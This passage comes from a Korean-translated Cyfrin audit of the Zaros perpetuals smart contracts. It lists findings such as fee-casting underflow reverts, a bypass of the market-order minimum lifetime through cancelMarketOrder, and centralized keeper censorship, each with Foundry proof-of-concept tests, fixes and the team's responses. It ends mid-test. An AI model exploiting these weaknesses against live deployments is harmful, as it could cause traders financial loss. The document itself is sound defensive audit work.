173:     ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
174:     : ctx.pnl.abs().intoUD60x18();
175:
176:     tradingAccount.deductAccountMargin({
177:         feeRecipients: FeeRecipients.Data({
178:         marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
179:         orderFeeRecipient: globalConfiguration.orderFeeRecipient,
180:         settlementFeeRecipient: globalConfiguration.settlementFeeRecipient
181:     }),
182:     pnlUsdX18: marginToDeductUsdX18,
183:     orderFeeUsdX18: ctx.orderFeeUsdX18.gt(SD_ZERO) ? ctx.orderFeeUsdX18.intoUD60x18() : UD_ZERO,
184:     settlementFeeUsdX18: ctx.settlementFeeUsdX18
185:     });
```

L183에서 볼 수 있듯이, `orderFeeUsdX18`이 음수일 수 있다고 가정하는데, 이는 `makerFee/takerFee`가 음수일 때만 가능합니다.

그러나 L173의 계산 중에 `orderFeeUsdX18`을 `UD60x18`로 직접 변환하며, 음수 주문 수수료일 경우 되돌려집니다.

```solidity
/// @notice Casts an SD59x18 number into UD60x18.
/// @dev Requirements:
/// - x must be positive.
function intoUD60x18(SD59x18 x) pure returns (UD60x18 result) {
    int256 xInt = SD59x18.unwrap(x);
    if (xInt < 0) {
        revert CastingErrors.PRBMath_SD59x18_IntoUD60x18_Underflow(x);
    }
    result = UD60x18.wrap(uint256(xInt));
}
```

이 되돌림(revert)이 발생하지 않았다면 `marginToDeductUsdX18`의 계산은 올바르지 않았을 것입니다:
```
Normal Case - positive order fee
================================
```
일반적인 경우 - 양수 주문 수수료
================================

미실현 PnL + 누적 펀딩 = -1000, 주문 수수료(USD) = 100, 정산 수수료(USD) = 200

ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
    oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));

ctx.pnl = -1000 + (unary(100 + 200))
        = -1000 + (unary(300))
        = -1000 - 300
        = -1300

=> ctx.pnl이 주문 및 정산 수수료의 합계만큼 증가함 (손실 증가 의미)


UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
    ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
    : ctx.pnl.abs().intoUD60x18();

marginToDeductUsdX18 = ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
                     = 1300 - (100 + 200)
                     = 1300 - 300
                     = 1000

=> marginToDeductUsdX18이 원래의 미실현 PnL + 누적 펀딩과 동일함


극단적 경우 - 음수 주문 수수료
==============================

미실현 PnL + 누적 펀딩 = -1000, 주문 수수료(USD) = -100, 정산 수수료(USD) = 200

ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
    oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));


ctx.pnl = -1000 + (unary(-100 + 200))
        = -1000 + (unary(100))
        = -1000 - 100
        = -1100

=> ctx.pnl이 주문 수수료와 정산 수수료 간의 차이만큼 감소함 (손실 감소 의미)

UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
    ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
    : ctx.pnl.abs().intoUD60x18();

marginToDeductUsdX18 = ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
                     = 1100 - (100 + 200) // -100 주문 수수료는 되돌려지지(reverting) 않는 `intoUD60x18`로 인해 100이 됨
                     = 1100 - 300
                     = 800

=> marginToDeductUsdX18이 공제되어야 할 금액보다 훨씬 낮음
```

**영향:** `SettlementBranch::_fillOrder`가 예상치 못하게 되돌려질(revert) 수 있습니다.

**권장 완화 방법:** '`SettlementBranch::_fillOrder`가 음수 PNL의 절댓값이 주문 및 정산 수수료의 합보다 작으면 되돌려짐(revert)'이라는 다른 낮은 위험 이슈와 동일한 완화 방법을 가집니다.

**Zaros:** 커밋 [e03228e](https://github.com/zaros-labs/zaros-core/commit/d37c37abab40bfa2320c6925c359faa501577eb3)에서 더 이상 음수 수수료를 지원하지 않음으로써 수정되었습니다; `makerFee`와 `takerFee`는 이제 모두 부호가 없습니다(unsigned).

**Cyfrin:** 확인됨.


### `LiquidationBranch::liquidateAccounts`에서 청산 시 최대 미결제 약정(max open interest) 확인 제거

**설명:** `LiquidationBranch::liquidateAccounts`에서 `PerpMarket::checkOpenInterestLimits`를 호출할 이유가 없습니다. 그 이유는 다음과 같습니다:
* 청산은 항상 미결제 약정을 감소시키므로 청산이 최대 미결제 약정 한도를 위반할 수 없습니다.
* 스큐(skew) 확인이 수행되지 않습니다.

따라서 청산 시 이 확인은 필요하지 않습니다. 이 확인이 있을 때의 위험은 관리자가 최대 미결제 약정 한도를 현재 미결제 약정보다 낮게 설정하면 모든 청산이 되돌려진다는(revert) 것입니다.

**권장 완화 방법:**
```diff
- (ctx.newOpenInterestX18, ctx.newSkewX18) = perpMarket.checkOpenInterestLimits(
-     ctx.liquidationSizeX18, ctx.oldPositionSizeX18, sd59x18(0), false
- );
```

**Zaros:** 커밋 [783ea67](https://github.com/zaros-labs/zaros-core/commit/783ea67979b79bce3a74dbaf19e53503034c9349)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 무기한 시장의 `maxOpenInterest`가 현재 미결제 약정보다 작게 업데이트되는 상태를 적절하게 처리

**설명:** `GlobalConfigurationBranch::updatePerpMarketConfiguration`은 `maxOpenInterest != 0`인지만 확인한 다음 `MarketConfiguration::update`를 호출하여 `maxOpenInterest`를 임의의 0이 아닌 값으로 설정합니다.

이는 프로토콜 관리자가 `maxOpenInterest`를 현재 미결제 약정보다 작게 업데이트할 수 있음을 의미합니다. 이러한 상태는 `PerpMarket::checkOpenInterestLimits`의 확인으로 인해 청산을 포함한 해당 시장의 많은 트랜잭션을 실패하게 만듭니다.

**권장 완화 방법:** 첫 번째 옵션은 `maxOpenInterest`가 현재 미결제 약정보다 작게 업데이트되지 않도록 방지하는 것입니다. 그러나 예를 들어 프로토콜 관리자가 현재 시장의 규모를 줄여 노출을 제한하려는 경우와 같이 이를 수행해야 할 타당한 이유가 있을 수 있습니다.

따라서 다른 옵션은 `PerpMarket::checkOpenInterestLimits`의 확인을 `skew` 확인과 유사하게 수정하는 것입니다; 즉, 감소된 값이 현재 구성된 `maxOpenInterest`보다 크더라도 현재 미결제 약정을 줄이는 트랜잭션이라면 허용하는 것입니다.

**Zaros:** 커밋 [8a3436c](https://github.com/zaros-labs/zaros-core/commit/8a3436ca522587b9ae631a65ae7f8343ce536e71)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `MarketOrder` 최소 수명(minimum lifetime)을 쉽게 우회할 수 있음

**설명:** `OrderBranch::createMarketOrder`는 이전 보류 중인 시장 주문을 취소하고 새 시장 주문을 열기 전에 `marketOrderMinLifetime`을 검증합니다:
```solidity
File: OrderBranch.sol
                // @audit `createMarketOrder` enforces minimum market order lifetime
210:         marketOrder.checkPendingOrder();
211:         marketOrder.update({ marketId: params.marketId, sizeDelta: params.sizeDelta });

File: MarketOrder.sol
55:     function checkPendingOrder(Data storage self) internal view {
56:         GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();
57:         uint128 marketOrderMinLifetime = globalConfiguration.marketOrderMinLifetime;
58:
59:         if (self.timestamp != 0 && block.timestamp - self.timestamp <= marketOrderMinLifetime) {
60:             revert Errors.MarketOrderStillPending(self.timestamp);
61:         }
62:     }
```

그러나 `OrderBranch::cancelMarketOrder`에서 사용자는 검증 없이 보류 중인 시장 주문을 취소할 수 있습니다:
```solidity
File: OrderBranch.sol
219:     function cancelMarketOrder(uint128 tradingAccountId) external {
220:         MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);
221:         // @audit 최소 시장 주문 수명을 강제하지 않음
222:         marketOrder.clear();
223:
224:         emit LogCancelMarketOrder(msg.sender, tradingAccountId);
225:     }
```

따라서 사용자는 먼저 `cancelMarketOrder`를 호출하여 이전 시장 주문을 취소하고 언제든지 새 주문을 열 수 있습니다.

**영향:** `cancelMarketOrder`를 먼저 호출하여 `marketOrderMinLifetime` 요구 사항을 우회할 수 있습니다.

**권장 완화 방법:** `cancelMarketOrder`는 `marketOrderMinLifetime` 요구 사항을 확인해야 합니다.

```diff
    function cancelMarketOrder(uint128 tradingAccountId) external {
        MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);

+       marketOrder.checkPendingOrder();

        marketOrder.clear();

        emit LogCancelMarketOrder(msg.sender, tradingAccountId);
    }
```

**Zaros:** 커밋 [41eae0e](https://github.com/zaros-labs/zaros-core/commit/41eae0ea8f04ffd877484bd7b430d7d85893f421#diff-1329f2388c20edbc7edf3e949fdb903992444d015a681e83fc62a6a02ef51b76R236)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 프로토콜 팀이 중앙 집중식 키퍼를 통해 트레이더를 검열할 수 있음

**설명:** 프로토콜 팀은 다음과 같은 이유로 트레이더를 검열할 수 있습니다:
* 키퍼만이 트레이더의 시장 주문을 이행할 수 있음
* 프로토콜 팀이 어떤 주소가 키퍼가 될 수 있는지를 제어함

**영향:** 프로토콜 팀은 주문을 절대 채우지 않음으로써 트레이더를 검열할 수 있습니다; 예를 들어, 트레이더가 오픈 레버리지 포지션을 닫는 것을 막을 수 있으며, 이는 시장이 포지션에 불리하게 움직일 경우 청산 대상이 되기 때문에 트레이더에게 심각한 불이익을 줍니다.

프로토콜 팀은 또한 일부 트레이더에게 이익이 되는 보류 중인 거래를 채우기 위해 특정 주문을 선택함으로써 다른 트레이더보다 일부 트레이더를 선호할 수 있습니다.

**권장 완화 방법:** 프로토콜 버전 1을 메인넷에 출시하는 관점에서는 중앙 집중식 키퍼를 사용하는 것이 더 쉽고 간단하며 프로토콜 팀에게 프로토콜에 대한 더 많은 제어 권한을 제공합니다. 또한 프로토콜에 대한 신뢰를 무너뜨릴 것이기 때문에 프로토콜 팀이 이 메커니즘을 남용할 위험은 거의 없을 것입니다. 그러나 장기적으로는 분산형 키퍼로 이동하는 것이 이상적입니다.

**Zaros:** 인지함.


### 프로토콜 팀이 중앙 집중식 청산인을 통해 트레이더 청산을 우선적으로 거부할 수 있음

**설명:** 프로토콜 팀은 다음과 같은 이유로 트레이더 청산을 우선적으로 거부할 수 있습니다:
* 청산인만이 청산 대상인 트레이더를 청산할 수 있음
* 프로토콜 팀이 어떤 주소가 청산인이 될 수 있는지를 제어함

**영향:** 프로토콜 팀은 일부 트레이더(예: 일부 거래 계정이 프로토콜 및/또는 팀 구성원에 의해 운영되는 경우)에 대한 청산을 거부하여 청산 없이 불리한 시장 움직임을 견딜 수 있게 함으로써 다른 트레이더보다 유리한 위치를 제공할 수 있습니다.

**권장 완화 방법:** 프로토콜 버전 1을 메인넷에 출시하는 관점에서는 중앙 집중식 청산인을 사용하는 것이 더 쉽고 간단하며 프로토콜 팀에게 프로토콜에 대한 더 많은 제어 권한을 제공합니다. 또한 프로토콜에 대한 신뢰를 무너뜨릴 것이기 때문에 프로토콜 팀이 이 메커니즘을 남용할 위험은 거의 없을 것입니다. 그러나 장기적으로는 분산형 청산인으로 이동하는 것이 이상적입니다.

**Zaros:** 인지함.


### 트레이더가 시장 주문 생성 시 슬리피지(slippage) 및 만료 시간을 제한할 수 없음

**설명:** 트레이더는 시장 주문을 생성할 때 슬리피지와 만료 시간을 제한할 수 없습니다.

**영향:** 트레이더의 주문은 예상보다 늦게 그리고 덜 유리한 가격으로 채워질 수 있습니다.

**권장 완화 방법:** 트레이더가 허용할 수 있는 최대 슬리피지(허용 가능한 가격)와 주문이 채워져야 하는 만료 시간을 지정할 수 있도록 허용하십시오.

가격은 `SettlementBranch::_fillOrder`의 `ctx.fillPrice`에 저장된 "Mark Price"와 대조하여 검증되어야 합니다.

흥미롭게도 `leaves/MarketOrder.sol`의 `Data` 구조체에는 트레이더가 주문을 생성한 타임스탬프인 `timestamp` 변수가 있지만, 주문이 채워질 때 이는 확인되지 않습니다.

**Zaros:** 커밋 [62c0e61](https://github.com/zaros-labs/zaros-core/commit/62c0e613ab02435dc0c3de9abdb14d7d880f2941)에서 사용자가 `targetPrice`를 지정할 수 있는 새로운 "Off-Chain" 주문 기능을 구현했습니다. 이 기능은 추가적인 오프체인 코드를 사용하여 지정가, 역지정가(stop), 이익 실현/손절매(TP/SL) 및 기타 유형의 트리거 기반 주문을 구현할 수 있을 만큼 유연합니다.

**Cyfrin:** 이 새로운 기능이 `targetPrice` 조건을 통해 사용자가 슬리피지를 강제할 수 있는 방법을 제공함을 확인했습니다. 새로운 기능은 마감 기한 확인을 제공하지 않지만, 사용자가 주문 상태를 주시하고 오프체인에서 취소할 수 있으므로 덜 중요합니다. 또한 이 새로운 기능의 보안은 이번 감사 중에 평가되지 않았지만 이어지는 경쟁 감사에서 평가될 것입니다.


### PNL의 절대값이 주문 및 정산 수수료의 합보다 작으면 `SettlementBranch::_fillOrder`가 되돌려짐(revert)

**설명:** `SettlementBranch::_fillOrder`는 포지션의 PNL을 `pnl = unrealizedPnl + accruedFunding + unary(orderFee + settlementFee)`로 계산합니다:

```solidity
File: SettlementBranch.sol
141: ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
142:     oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
143:     ).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));
144:
```

PNL이 양수이고 `unrealized_pnl + accrued_funding < order_fee + settlement_fee`이면 언더플로로 인해 되돌려집니다.

PNL이 음수이면 계정의 증거금에서 금액이 공제됩니다:

```solidity
171: if (ctx.pnl.lt(SD_ZERO)) {
172:     UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
         // @audit abs(pnl) < order_fee+settlement_fee이면 언더플로로 되돌려질(revert) 수 있음
173:     ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
174:     : ctx.pnl.abs().intoUD60x18();
175:
176:     tradingAccount.deductAccountMargin({
177:         feeRecipients: FeeRecipients.Data({
178:         marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
179:         orderFeeRecipient: globalConfiguration.orderFeeRecipient,
180:         settlementFeeRecipient: globalConfiguration.settlementFeeRecipient
181:     }),
182:     pnlUsdX18: marginToDeductUsdX18,
183:     orderFeeUsdX18: ctx.orderFeeUsdX18.gt(SD_ZERO) ? ctx.orderFeeUsdX18.intoUD60x18() : UD_ZERO,
184:     settlementFeeUsdX18: ctx.settlementFeeUsdX18
185:     });
```

다음과 같은 경우 L173의 `marginToDeductUsdX18` 계산의 첫 번째 조건은 언더플로로 인해 되돌려집니다:
* 트레이더에게 손실(음수 PNL)이 있음
* 손실의 절대값이 주문/정산 수수료의 합보다 작음

**개념 증명 (Proof of Concept):** `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`에 다음 PoC를 추가하십시오:
```solidity
function test_OrderRevertsUnderflowWhenPositivePnlLessThanFees() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 0.002e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // market moves slightly against Naruto's position
    // giving Naruto's position a slightly negative PNL
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE+1);

    // naruto attempts to close their position
    changePrank({ msgSender: users.naruto });

    // reverts due to underflow
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA/2);
}

function test_OrderRevertsUnderflowWhenNegativePnlLessThanFees() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 0.002e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // market moves slightly against Naruto's position
    // giving Naruto's position a slightly negative PNL
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE-1);

    // naruto attempts to partially close their position
    changePrank({ msgSender: users.naruto });

    // reverts due to underflow
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA/2);
}
```

실행:
* `forge test --match-test test_OrderRevertsUnderflowWhenPositivePnlLessThanFees -vvv`
* `forge test --match-test test_OrderRevertsUnderflowWhenNegativePnlLessThanFees -vvv`

**권장 완화 방법:** 이전 포지션 PNL이 정산되고 주문/정산 수수료가 지불되는 방식 리팩토링.

**Zaros:** 커밋 [516bc2a](https://github.com/zaros-labs/zaros-core/commit/516bc2ad61d64e94654db500a93bd19567ca01e5)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 스큐(skew)가 0이고 거래가 매수 주문일 때 `PerpMarket::getOrderFeeUsd`가 `makerFee`를 잘못 부과함

**설명:** `PerpMarket::getOrderFeeUsd`에는 제가 끝에 (*)를 추가한 이 주석이 있습니다:
```solidity
/// @dev When the skew is zero, taker fee will be charged. (*)
```

그러나 `if` 문의 부울 표현식에 대한 진리표(truth table)를 작성하면 이 주석이 항상 참은 아님을 알 수 있습니다:
```solidity
// isSkewGtZero = true,  isBuyOrder = true  -> taker fee
// isSkewGtZero = true,  isBuyOrder = false -> maker fee
// isSkewGtZero = false, isBuyOrder = true  -> maker fee (*)
// isSkewGtZero = false, isBuyOrder = false -> taker fee
if (isSkewGtZero != isBuyOrder) {
    // not equal charge maker fee
    feeBps = sd59x18((self.configuration.orderFees.makerFee));
} else {
    // equal charge taker fee
    feeBps = sd59x18((self.configuration.orderFees.takerFee));
}
```

`isSkewGtZero == false && isBuyOrder = true`일 때, 스큐가 0이므로 이 주문이 스큐를 유발함에도 불구하고 *메이커* 수수료가 청구됩니다. 이 동작은 주석이 말하는 것과 반대이며, 논리적으로 거래가 스큐를 유발하는 경우 *테이커* 수수료가 청구되어야 합니다.

**영향:** 잘못된 수수료가 청구됩니다.

**권장 완화 방법:** `isSkewGtZero == false && isBuyOrder = true`일 때 트레이더가 스큐를 유발하므로 *테이커* 수수료가 청구되어야 합니다.

**Zaros:** 커밋 [534b089](https://github.com/zaros-labs/zaros-core/commit/534b0891d836e1cd01daf808f72c39269aa213ae) 및 [5822b19](https://github.com/zaros-labs/zaros-core/commit/5822b19b987b23fb3373afc0fb3e7a30441cdd01)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `PerpMarket::getOrderFeeUsd`는 스큐를 뒤집는(flip) 트레이더에게 전체 거래에 대해 `makerFee`로 보상함

**설명:** `PerpMarket::getOrderFeeUsd`는 스큐를 뒤집는 트레이더에게 전체 거래에 대해 `makerFee`로 보상합니다. 트레이더가 스큐를 뒤집었으므로 그들의 거래는 부분적으로 반대 스큐를 생성했고, 따라서 그들의 거래는 부분적으로 `maker`일 뿐만 아니라 `taker`이기도 하므로 이는 이상적이지 않습니다.

**영향:** 트레이더는 스큐를 뒤집을 때 부분적으로만 `makerFee`를 받는 대신 전체를 받음으로써 내야 할 수수료보다 약간 적게 지불합니다.

**권장 완화 방법:** 거래가 스큐를 뒤집을 때, 트레이더는 스큐를 0으로 이동시킨 거래 부분에 대해서만 `makerFee`를 지불해야 합니다. 그런 다음 트레이더는 스큐를 뒤집은 나머지 거래 부분에 대해 `takerFee`를 지불해야 합니다.

**Zaros:** 커밋 [5822b19](https://github.com/zaros-labs/zaros-core/commit/5822b19b987b23fb3373afc0fb3e7a30441cdd01)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `OrderBranch::getMarginRequirementForTrade`는 증거금 요건 계산 시 주문 및 정산 수수료를 포함하지 않음

**설명:** `OrderBranch::getMarginRequirementForTrade`는 증거금 요건을 계산할 때 주문 및 정산 수수료를 포함하지 않지만, [`OrderBranch::createMarketOrder`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/OrderBranch.sol#L197-L208)와 같은 다른 곳에서는 발생합니다.

**영향:** `OrderBranch::getMarginRequirementForTrade`는 실제로 필요한 것보다 낮은 담보 요건을 반환합니다. 이 함수는 스마트 계약 어디에서도 사용되지 않는 것으로 보이므로 사용자 인터페이스에만 영향을 미칠 가능성이 있습니다.

**권장 완화 방법:** `OrderBranch::getMarginRequirementForTrade`는 증거금 요건을 계산할 때 주문 및 정산 수수료를 반영해야 합니다. 다음과 같이 수행하는 `OrderBranch::simulateTrade`를 복사할 수 있습니다:
```solidity
orderFeeUsdX18 = perpMarket.getOrderFeeUsd(sd59x18(sizeDelta), fillPriceX18);
settlementFeeUsdX18 = ud60x18(uint256(settlementConfiguration.fee));
```

**Zaros:** 커밋 [5542a04](https://github.com/zaros-labs/zaros-core/commit/5542a04c976d705ad0fcc86eff58a4ad815d4535)에서 수정되었습니다.

**Cyfrin:** 확인됨.

\clearpage
## 정보성 (Informational)


### 사용되지 않는 변수

**설명:** 일부 오류와 상수는 코드베이스에서 사용되지 않습니다.

```solidity
File: Errors.sol
11:     error InvalidParameter(string parameter, string reason);
38:     error OnlyForwarder(address sender, address forwarder);
79:     error InvalidLiquidationReward(uint128 liquidationFeeUsdX18);

File: Constants.sol
10:     uint32 internal constant MAX_MIN_DELEGATE_TIME = 30 days;
```

**Zaros:** 커밋 [37071ed](https://github.com/zaros-labs/zaros-core/commit/37071ed2c6845121e2eda4143ad233d20a1d7e6f)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `params.initialMarginRateX18 <= params.maintenanceMarginRateX18`일 때 더 적합한 오류 유형 반환

**설명:** `GlobalConfigurationBranch::createPerpMarket`에서 다음 두 가지 오류 사례는 모두 `ZeroInput` 오류 유형을 반환합니다:
```solidity
if (params.initialMarginRateX18 <= params.maintenanceMarginRateX18) {
    revert Errors.ZeroInput("initialMarginRateX18");
}
if (params.initialMarginRateX18 == 0) {
    revert Errors.ZeroInput("initialMarginRateX18");
}
```

`initialMarginRateX18 < maintenanceMarginRateX18`인 첫 번째 경우 오류는 오해의 소지가 있습니다. `InvalidParameter`와 같은 더 적합한 오류 유형을 반환해야 합니다.

`GlobalConfigurationBranch::updatePerpMarketConfiguration`에서도 동일한 현상이 발생하지만, 여기서는 두 번째 확인 `initialMarginRateX18 == 0`이 생략되었습니다. 이 확인을 추가할지 고려하십시오.

첫 번째 검증이 항상 먼저 되돌려지기 때문에 두 번째 검증은 중복될 수 있습니다; 0인 경우에 대해 특정 오류를 원한다면 먼저 수행하고, 그렇지 않으면 제거를 고려하십시오.

**Zaros:** 커밋 [c35e2be](https://github.com/zaros-labs/zaros-core/commit/c35e2bea50a0753726ac79503e607e9dcf637b6b)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `accountId` 데이터 유형 표준화

**설명:** `accountId`는 다른 계약에서 다른 데이터 유형을 사용합니다:
* [`GlobalConfiguration::Data`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/GlobalConfiguration.sol#L44)에서 `uint96`
* [`TradingAccount::Data`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/TradingAccount.sol#L45) 및 [`TradingAccountBranch::createTradingAccount`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/TradingAccountBranch.sol#L219)에서 `uint128`
* [`AccountNFT`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/account-nft/AccountNFT.sol#L18-L22)에서 `uint256`.

**권장 완화 방법:** 모든 곳에서 하나의 데이터 유형으로 표준화하십시오.

**Zaros:** 기본값으로 uint128 데이터 유형을 사용할 것이지만:
* 스토리지 값을 팩(pack)하기 위해 `GlobalConfiguration::Data`에서는 `uint96`
* `ERC721::_update`를 재정의(override)하기 위해 AccountNFT에서는 `uint256`


### `LogConfigureMarginCollateral` 이벤트가 `loanToValue`를 방출하지 않음

**설명:** [LogConfigureMarginCollateral](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/GlobalConfigurationBranch.sol#L212) 이벤트는 마진 담보 구성 중 `loanToValue`를 생략합니다.

**권장 완화 방법:** `loanToValue`도 방출할 것을 권장합니다.

**Zaros:** 커밋 [aef72cd](https://github.com/zaros-labs/zaros-core/commit/aef72cdc4319314c2a4b9497ba39a5621657f7b4)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 무기한 시장 생성/업데이트 중 일관성 없는 검증

**설명:** `GlobalConfigurationBranch::createPerpMarket`은 `maxFundingVelocity`가 0이면 [되돌려지지만](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/GlobalConfigurationBranch.sol#L351-L353), `GlobalConfigurationBranch::updatePerpMarketConfiguration`에서는 동일한 확인이 발생하지 않습니다.

**권장 완화 방법:** 무기한 시장을 생성하고 업데이트할 때 동일한 검증을 적용하는 것을 고려하십시오.

**Zaros:** 커밋 [ad2bcb1](https://github.com/zaros-labs/zaros-core/commit/ad2bcb114a9aaa0ed8838e05335d78badb51032b)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `GlobalConfigurationBranch::updateSettlementConfiguration`이 존재하지 않는 `marketId`에 대해 호출될 수 있음

**설명:** `GlobalConfigurationBranch::updateSettlementConfiguration`은 `marketId`가 존재하는지 확인하지 않습니다:

```solidity
function updateSettlementConfiguration(
    uint128 marketId,
    uint128 settlementConfigurationId,
    SettlementConfiguration.Data memory newSettlementConfiguration
)
    external
    onlyOwner
{
    SettlementConfiguration.update(marketId, settlementConfigurationId, newSettlementConfiguration);

    emit LogUpdateSettlementConfiguration(msg.sender, marketId, settlementConfigurationId);
}
```

그러나 `updatePerpMarketStatus`와 같은 다른 함수는 `marketId`가 존재하는지 확인합니다:

```solidity
function updatePerpMarketStatus(uint128 marketId, bool enable) external onlyOwner {
    GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();
    PerpMarket.Data storage perpMarket = PerpMarket.load(marketId);

    if (!perpMarket.initialized) {
        revert Errors.PerpMarketNotInitialized(marketId);
    }
```

**권장 완화 방법:** `updateSettlementConfiguration`에서 `marketId` 유효성을 확인하십시오.

**Zaros:** 커밋 [75be42e](https://github.com/zaros-labs/zaros-core/commit/75be42e892c13cb26876d66b0c5184971700714e)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 담보 가격 피드가 0을 반환하면 청산이 되돌려짐(revert)

**설명:** 담보 가격 피드가 0을 반환하면 청산이 되돌려집니다. 일반적으로 Chainlink 가격 피드에는 항상 적어도 반환해야 하는 `minAnswer`가 내장되어 있으므로 이런 일은 발생하지 않아야 합니다. 그러나 트레이더가 다양한 담보 바스켓을 가질 수 있으므로, 이 극단적인 경우를 처리하고 다른 담보를 청산하려고 시도하는 것이 가치가 있을 수 있습니다.

**개념 증명 (Proof of Concept):** `test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol`에 다음 PoC를 추가하십시오:
```solidity
function test_LiquidationRevertsWhenPriceFeedReturnsZero() external {
    // give naruto some wstEth to deposit as collateral
    uint256 USER_STARTING_BALANCE = 1e18;
    int128  USER_POS_SIZE_DELTA   = 1e18;
    deal({ token: address(mockWstEth), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(mockWstEth));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // price of naruto's collateral has a LUNA-like crash
    // this code occur while the L2 stopped producing blocks
    // as recently happened during the Linea hack such that
    // the liquidation bots could not perform a timely
    // liquidation of the position
    MockPriceFeed wstEthPriceFeed = mockPriceAdapters.mockWstEthUsdPriceAdapter;
    wstEthPriceFeed.updateMockPrice(0);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // attempt to liquidate naruto
    changePrank({ msgSender: liquidationKeeper });
